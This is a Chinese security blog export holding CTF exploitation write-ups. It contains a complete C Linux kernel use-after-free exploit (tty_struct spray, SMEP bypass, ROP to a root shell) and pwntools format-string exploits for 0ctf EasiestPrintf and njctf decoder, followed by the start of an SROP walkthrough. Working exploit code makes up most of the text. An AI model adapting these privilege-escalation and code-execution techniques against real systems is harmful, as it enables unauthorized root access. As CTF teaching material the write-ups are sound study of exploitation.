<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;errno.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;pty.h&gt;</div><div class="line">#include &lt;sys/mman.h&gt;</div><div class="line">#include &lt;sys/ipc.h&gt;</div><div class="line">#include &lt;sys/sem.h&gt;</div><div class="line"></div><div class="line">#define TTY_STRUCT_SIZE 0x2e0</div><div class="line">#define SPRAY_ALLOC_TIMES 0x100</div><div class="line"></div><div class="line">int spray_fd[0x100];</div><div class="line"></div><div class="line">/* // 将tty_struct放入UAF空间，将第24字节的位置用伪造的tty_operations替换，如147、148行所示</div><div class="line">tty_struct:</div><div class="line">int magic; // 4</div><div class="line">struct kref kref; // 4</div><div class="line">struct device *dev; // 8</div><div class="line">struct tty_driver *driver; // 8</div><div class="line">const struct tty_operations *ops; // 8, offset = 4 + 4 + 8 + 8 = 24</div><div class="line">[...]</div><div class="line">*/</div><div class="line"></div><div class="line">struct tty_operations &#123;</div><div class="line">    struct tty_struct * (*lookup)(struct tty_driver *driver,</div><div class="line">    struct file *filp, int idx);</div><div class="line">    int (*install)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);</div><div class="line">    int (*open)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*close)(struct tty_struct * tty, struct file * filp);</div><div class="line">    void (*shutdown)(struct tty_struct *tty);</div><div class="line">    void (*cleanup)(struct tty_struct *tty);</div><div class="line">    int (*write)(struct tty_struct * tty,</div><div class="line">    const unsigned char *buf, int count);</div><div class="line">    int (*put_char)(struct tty_struct *tty, unsigned char ch);</div><div class="line">    void (*flush_chars)(struct tty_struct *tty);</div><div class="line">    int (*write_room)(struct tty_struct *tty);</div><div class="line">    int (*chars_in_buffer)(struct tty_struct *tty);</div><div class="line">    int (*ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    long (*compat_ioctl)(struct tty_struct *tty,</div><div class="line">    unsigned int cmd, unsigned long arg);</div><div class="line">    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);</div><div class="line">    void (*throttle)(struct tty_struct * tty);</div><div class="line">    void (*unthrottle)(struct tty_struct * tty);</div><div class="line">    void (*stop)(struct tty_struct *tty);</div><div class="line">    void (*start)(struct tty_struct *tty);</div><div class="line">    void (*hangup)(struct tty_struct *tty);</div><div class="line">    int (*break_ctl)(struct tty_struct *tty, int state);</div><div class="line">    void (*flush_buffer)(struct tty_struct *tty);</div><div class="line">    void (*set_ldisc)(struct tty_struct *tty);</div><div class="line">    void (*wait_until_sent)(struct tty_struct *tty, int timeout);</div><div class="line">    void (*send_xchar)(struct tty_struct *tty, char ch);</div><div class="line">    int (*tiocmget)(struct tty_struct *tty);</div><div class="line">    int (*tiocmset)(struct tty_struct *tty,</div><div class="line">    unsigned int set, unsigned int clear);</div><div class="line">    int (*resize)(struct tty_struct *tty, struct winsize *ws);</div><div class="line">    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</div><div class="line">    int (*get_icount)(struct tty_struct *tty,</div><div class="line">    struct serial_icounter_struct *icount);</div><div class="line">    const struct file_operations *proc_fops;</div><div class="line">&#125;;</div><div class="line"></div><div class="line">typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);</div><div class="line">typedef unsigned long __attribute__((regparm(3))) (*_prepare_kernel_cred)(unsigned long cred);</div><div class="line"></div><div class="line">/* Gadgets */</div><div class="line">_commit_creds commit_creds = (_commit_creds) 0xffffffff810a1420;</div><div class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) 0xffffffff810a1810;</div><div class="line">unsigned long native_write_cr4 = 0xFFFFFFFF810635B0; // 写入cr4来关闭smep</div><div class="line">unsigned long xchgeaxesp = 0xFFFFFFFF81007808; // 设置栈</div><div class="line">unsigned long poprdiret = 0xFFFFFFFF813E7D6F;</div><div class="line">//unsigned long iretq = 0xFFFFFFFF8181A797;</div><div class="line">unsigned long iretq = 0xffffffff814e35ef;</div><div class="line">unsigned long swapgs = 0xFFFFFFFF81063694;  // 回到用户空间之前的准备</div><div class="line"></div><div class="line">/* status */</div><div class="line">unsigned long user_cs, user_ss, user_rflags;</div><div class="line">void save_stats() &#123;</div><div class="line">    asm(</div><div class="line">        &quot;movq %%cs, %0\n&quot; // mov rcx, cs</div><div class="line">        &quot;movq %%ss, %1\n&quot; // mov rdx, ss</div><div class="line">        &quot;pushfq\n&quot;        // 把rflags的值压栈</div><div class="line">        &quot;popq %2\n&quot;       // pop rax</div><div class="line">        :&quot;=r&quot;(user_cs), &quot;=r&quot;(user_ss), &quot;=r&quot;(user_rflags) : : &quot;memory&quot; // mov user_cs, rcx; mov user_ss, rdx; mov user_flags, rax</div><div class="line">        );</div><div class="line">&#125;</div><div class="line"></div><div class="line">void get_shell() &#123;</div><div class="line">    system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div><div class="line"></div><div class="line">void get_root() &#123;</div><div class="line">    commit_creds(prepare_kernel_cred(0));</div><div class="line">&#125;</div><div class="line"></div><div class="line">void exploit() &#123;</div><div class="line">    int i;</div><div class="line">    char *buf = (char*)malloc(0x1000);</div><div class="line">    struct tty_operations *fake_tty_operations = (struct tty_operations *)malloc(sizeof(struct tty_operations));</div><div class="line"></div><div class="line">    save_stats();</div><div class="line"></div><div class="line">    memset(fake_tty_operations, 0, sizeof(struct tty_operations));</div><div class="line">    fake_tty_operations-&gt;ioctl = (unsigned long)xchgeaxesp; // 设置tty的ioctl操作为栈转移指令</div><div class="line"></div><div class="line">    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);</div><div class="line">    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);</div><div class="line"></div><div class="line">    ioctl(fd1, 0x10001, TTY_STRUCT_SIZE);</div><div class="line">    write(fd2, &quot;hello world&quot;, strlen(&quot;hello world&quot;));</div><div class="line">    close(fd1);</div><div class="line"></div><div class="line">    // spray tty 这里的堆喷射其实去掉也能成功，因为是释放后紧接着申请的</div><div class="line">    puts(&quot;[+] Spraying buffer with tty_struct&quot;);</div><div class="line">    for (i = 0; i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</div><div class="line">        spray_fd[i] = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);</div><div class="line">        if (spray_fd[i] &lt; 0) &#123;</div><div class="line">            perror(&quot;open tty&quot;);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    // 现在有一个tty_struct落在了UAF区域里</div><div class="line">    puts(&quot;[+] Reading buffer content from kernel buffer&quot;);</div><div class="line">    long size = read(fd2, buf, 32);</div><div class="line">    if (size &lt; 32) &#123;</div><div class="line">        puts(&quot;[-] Reading not complete!&quot;);</div><div class="line">        printf(&quot;[-] Only %ld bytes read.\n&quot;, size);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    // 检查喷射是否成功</div><div class="line">    puts(&quot;[+] Detecting buffer content type&quot;);</div><div class="line">    if (buf[0] != 0x01 || buf[1] != 0x54) &#123;</div><div class="line">        puts(&quot;[-] tty_struct spray failed&quot;);</div><div class="line">        printf(&quot;[-] We should have 0x01 and 0x54, instead we got %02x %02x\n&quot;, buf[0], buf[1]);</div><div class="line">        puts(&quot;[-] Exiting...&quot;);</div><div class="line">        exit(-1);</div><div class="line">    &#125;</div><div class="line">    // 设置tty_operations为伪造的操作</div><div class="line">    puts(&quot;[+] Spray complete. Modifying function pointer&quot;);</div><div class="line">    unsigned long *temp = (unsigned long *)&amp;buf[24];</div><div class="line">    *temp = (unsigned long)fake_tty_operations;</div><div class="line"></div><div class="line">    puts(&quot;[+] Preparing ROP chain&quot;);</div><div class="line">    unsigned long lower_address = xchgeaxesp &amp; 0xFFFFFFFF;</div><div class="line">    unsigned long base = lower_address &amp; ~0xfff;</div><div class="line">    printf(&quot;[+] Base address is %lx\n&quot;, base);</div><div class="line">    if (mmap(base, 0x30000, 7, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0) != base) &#123;</div><div class="line">        perror(&quot;mmap&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    unsigned long rop_chain[] = &#123;</div><div class="line">        poprdiret,</div><div class="line">        0x6f0,</div><div class="line">        native_write_cr4, // cr4 = 0x6f0</div><div class="line">        (unsigned long)get_root,</div><div class="line">        swapgs, // swapgs; pop rbp; ret</div><div class="line">        base,   // rbp = base</div><div class="line">        iretq,</div><div class="line">        (unsigned long)get_shell,</div><div class="line">        user_cs,</div><div class="line">        user_rflags,</div><div class="line">        base + 0x10000,</div><div class="line">        user_ss</div><div class="line">    &#125;;</div><div class="line">    memcpy((void*)lower_address, rop_chain, sizeof(rop_chain));</div><div class="line">    puts(&quot;[+] Writing function pointer to the driver&quot;);</div><div class="line">    long len = write(fd2, buf, 32);</div><div class="line">    if (len &lt; 0) &#123;</div><div class="line">        perror(&quot;write&quot;);</div><div class="line">        exit(1);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    puts(&quot;[+] Triggering&quot;);</div><div class="line">    for (i = 0;i &lt; SPRAY_ALLOC_TIMES; i++) &#123;</div><div class="line">        ioctl(spray_fd[i], 0, 0); // FFFFFFFF814D8AED call rax</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main() &#123;</div><div class="line">    exploit();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p> 内核态和用户态其实也差不多，主要就是对内存机制要非常了解。 <code>xchg esp, eax</code> 然后 <code>mmap</code> 即可控制 栈数据， 这个技巧确实厉害。使用 <code>gef</code> 没法调内核，换了 <code>pwndbg</code> 就可以了.</p>
<p><strong>参考</strong></p>
<p> <a href="http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/" target="_blank" rel="external">http://pwn4.fun/2017/08/15/Linux-Kernel-UAF/</a></p>
<p> <a href="http://bobao.360.cn/learning/detail/4148.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4148.html</a></p>
]]></content>
      
        <categories>
            
            <category> kernel </category>
            
        </categories>
        
        
        <tags>
            
            <tag> modify cred </tag>
            
            <tag> kernel rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞利用实战之 0ctf-easyprintf]]></title>
      <url>/2017/12/17/pwn_with_format_0ctf_easyprintf.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这是 <code>0ctf</code> 的一道比较简单的格式化串的题目。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>逻辑非常简单</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506132721kaldyhzb.png?imageslim" alt="paste image"></p>
<p><code>do_read</code> 可以打印内存地址的数据，可用来 泄露 <code>got</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506205821m9i5ym56.png?imageslim" alt="paste image"></p>
<p><code>leave</code> 格式化字符串漏洞。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506227980602voj1w.png?imageslim" alt="paste image"></p>
<p><code>printf(s)</code> 直接调用 <code>exit</code> 退出了。不过可以使用 <code>%1000c</code> 触发 <code>printf</code> 里面的 <code>malloc</code> 和 <code>free</code>, 所以思路很清楚了，修改 <code>free_hook</code> 或者 <code>malloc_hook</code> 为 <code>one_gadget</code>, 并且在格式化串末尾加上 <code>%1000c</code>触发 <code>malloc</code> 和 <code>free</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513506399803fdtgne0f.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>最开始修改 <code>free_hook</code>, 发现所有的 <code>one_gadget</code> 都不能用，后面使用了 <code>malloc_hook</code> ，终于找到一个可以用的，估计和寄存器的数据有关。</p>
<p>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;,log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./EasiestPrintf&quot;)</div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"></div><div class="line"># c</div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">setvbuf_got = 0x08049FF0 </div><div class="line">exit_got = 0x08049FE4</div><div class="line"></div><div class="line">pause()</div><div class="line">p.sendline(str(setvbuf_got))</div><div class="line">p.recvuntil(&quot;Which address you wanna read:\n&quot;)</div><div class="line">setvbuf_addr = int(p.recv(len(&apos;0xf7e60360&apos;)), 16)</div><div class="line">libc_addr = setvbuf_addr - 0x60360</div><div class="line">free_hook = libc_addr + 0x1b38b0</div><div class="line">malloc_hook = libc_addr + 0x1b2768</div><div class="line">one_gadget = libc_addr + 0x3ac69</div><div class="line">log.info(&quot;free_hook: &quot; + hex(free_hook))</div><div class="line">log.info(&quot;one_gadget: &quot; + hex(one_gadget))</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = fmtstr_payload(7, &#123;malloc_hook: one_gadget&#125;)  </div><div class="line">payload +=  &quot;%100000c&quot;</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> format string </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[格式化字符串漏洞利用实战之 njctf-decoder]]></title>
      <url>/2017/12/17/pwn_with_format_decoder.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>格式化字符串漏洞也是一种比较常见的漏洞利用技术。<code>ctf</code> 中也经常出现。</p>
<p>本文以 <code>njctf</code> 线下赛的一道题为例进行实战。</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/decoder" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/decoder</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序的流程如下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134756777207wotnxfu.png?imageslim" alt="paste image"></p>
<p>部分函数已经进行了标注，看程序打印出来的提示信息就知道这个是一个 <code>base64</code> 解码的程序，然后可以通过 <code>猜测 + 验证</code> 的方式，找到那个 用于 <code>base64</code> 解码的函数。</p>
<p>这个程序的漏洞在于将 <code>base64</code> 解码后的字符串直接传入 <code>snprintf</code>, 作为 <code>format</code> 进行处理， 格式化漏洞。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134762004787vfa2tjp.png?imageslim" alt="paste image"></p>
<p>通过格式化串可以 <strong>任意写/任意读</strong> ， 不过这里一次格式化之后就会往下一种走到程序末尾。所以这里我采用 修改 <code>printf@got</code>的值 为 <code>rop gadgets</code>,然后进行 <code>rop</code>.</p>
<p>还需要注意前面还有<code>check</code> ,不满足 <code>base64</code> 的格式规范的字符串是触发不了漏洞的。不过我们可以绕过这些 <code>check</code>。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513477638571o34ns4rx.png?imageslim" alt="paste image"></p>
<p>程序程序获取输入时使用的是 <code>read</code> 函数，然而后面的 <code>base64_check</code> 和 <code>base64_decode</code> 用到的输入的长度都是使用 <code>strlen</code> 获取的。<code>strlen</code> 是通过搜索 <code>\x00</code> 来确定字符串的长度， 而通过 <code>read</code> 我们可以输入 <code>\x00</code>， 所以我们在正常 <code>base64</code> 后面加上 <code>\x00</code> 然后布置 <code>rop chain</code> 即可。<br>还有一个小技巧，触发漏洞时 , <code>printf</code> 函数还没有被调用，所以 <code>got</code> 表中保存的值还是没有经过 <code>重绑定</code> 的值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476750593syzw31hb.png?imageslim" alt="paste image"></p>
<p>为了绕过栈里面的 <code>base64</code> 字符串 ，我们需要一个 <code>add esp</code> 的 <code>gadgets</code> 可以使用 <code>ROPgadget</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476881379j7em7v3w.png?imageslim" alt="paste image"></p>
<p>找到一个 <code>0x08048b31</code>, 和 <code>printf@got</code> 的值只有 <code>2</code>个字节的差距，所以使用 <code>%hn</code> 可以写两个字节，写的数据为 <code>0x8b31</code>,地址为 <code>0x0804B010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%35633c%7$hn</div></pre></td></tr></table></figure></p>
<p>然后后面调用 <code>printf</code> 时就会进入 <code>rop chain</code>, 首先通过 <code>rop</code> 调用 <code>puts</code> 打印 <code>read@got</code> 泄露 <code>libc</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134770899859p7k76ct.png?imageslim" alt="paste image"></p>
<p>然后再次触发漏洞，用刚刚 <code>leak</code>的数据，布置 <code>rop</code> 调用 <code>system(&#39;/bin/sh&#39;)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513477156821brdloq8e.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>对于 <code>strlen</code> 如果我们可以输入 <code>\x00</code>，则它的返回值我们是可以控制的。</p>
<p>通过部分修改 <code>got</code>，执行 <code>rop</code>，要注意后面紧跟着调用的函数。</p>
<p>最后的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./decoder&quot;)</div><div class="line"></div><div class="line">gdb.attach(p, &apos;&apos;&apos;</div><div class="line">b *0x08048C29</div><div class="line"># b *0x08048C4E  </div><div class="line">b *0x08048b31</div><div class="line"># b *0x8048c5f  </div><div class="line">c</div><div class="line"></div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">printf_got = 0x0804B010</div><div class="line">read_got = 0x0804B00C</div><div class="line"></div><div class="line">puts_plt = 0x08048520</div><div class="line"></div><div class="line">main_addr = 0x08048B37</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(0x0804B00C)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(&quot;THIS IS A SIMPLE BASE64 DECODER\n&quot;)</div><div class="line"></div><div class="line">read_addr = u32(p.recv(4))</div><div class="line">libc_addr = read_addr - 0xd5af0</div><div class="line">system_addr = libc_addr + 0x3ada0</div><div class="line">sh_addr = libc_addr + 1423787</div><div class="line"></div><div class="line">log.info(&quot;system: &quot; + hex(system_addr))</div><div class="line">log.info(&quot;/bin/sh: &quot; + hex(sh_addr))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(sh_addr)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> format string </tag>
            
            <tag> exploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[srop实战]]></title>
      <url>/2017/12/16/pwn_with_srop.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>srop</code> 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 <code>i春秋</code>的一个比赛。</p>
<p>题目链接：<br><a href="https://gitee.com/hac425/blog_data/blob/master/smallest" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/smallest</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序非常的简单</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513417180656goqrxx0p.png?imageslim" alt="paste image"><br>使用 <code>syscall</code> 进行系统调用，往 <code>rsp</code> 读入数据，然后 <code>ret</code>, 直接就可以控制 <code>rip</code>. </p>
<p>程序非常的小，除了 这里基本没有代码，但是我们有 <code>syscall</code> ，<code>srop</code>利用之。首先明确目标。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execve(“/bin/sh”, 0, 0)</div></pre></td></tr></table></figure>
<p><code>syscall</code> 的传参顺序为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdi,rsi,rdx,rcx,r8, r9</div></pre></td></tr></table></figure>
<p>然后 <code>rax</code> 存放 系统调用号 以及 <code>syscall</code> 的返回值。<br>所以我们需要设置 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rax=59</div><div class="line">rdi---&gt; /bin/sh</div><div class="line">rsi=0</div><div class="line">rdx=0</div></pre></td></tr></table></figure>
<p>然后 <code>syscall</code>.就可以拿到 <code>shell</code> 了。</p>
<p>使用 <code>srop</code> 我们可以控制所有的寄存器的值。<br>所以我们需要一个可写的地址在一次<code>srop</code>结束后设置为 <code>rsp</code>.</p>
<p><strong>下面根据 <code>exp</code> 进行讲解</strong></p>
<p>首先是通过栈中环境变量，泄露栈的地址，得到一个可写的地址，用于 <code>srop</code> 时设置 <code>rsp</code>.</p>
<p>因为 <code>write</code> 的系统调用号 为 <code>1</code>,  而且 <code>stdout</code> 也为 <code>1</code>, 这样我们输入一个字符。然后通过 <code>rop</code> 跳到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov     rdi, rax        ; fd</div><div class="line">syscall</div></pre></td></tr></table></figure>
<p>我们就能 调用 <code>write(1,rsi,rdx)</code>, 此时的 <code>rsi</code> 就是栈的地址，<code>rdx</code> 则为 <code>0x400</code>,我们就能 拿到 栈的地址。</p>
<p>有一点需要注意的是，我们需要事先布置好栈数据，然后再次进入 <code>start</code>, 控制 <code>rax</code>.因为我们要控制的 <code>rax</code> 值小于 我们需要布置的数据的长度。</p>
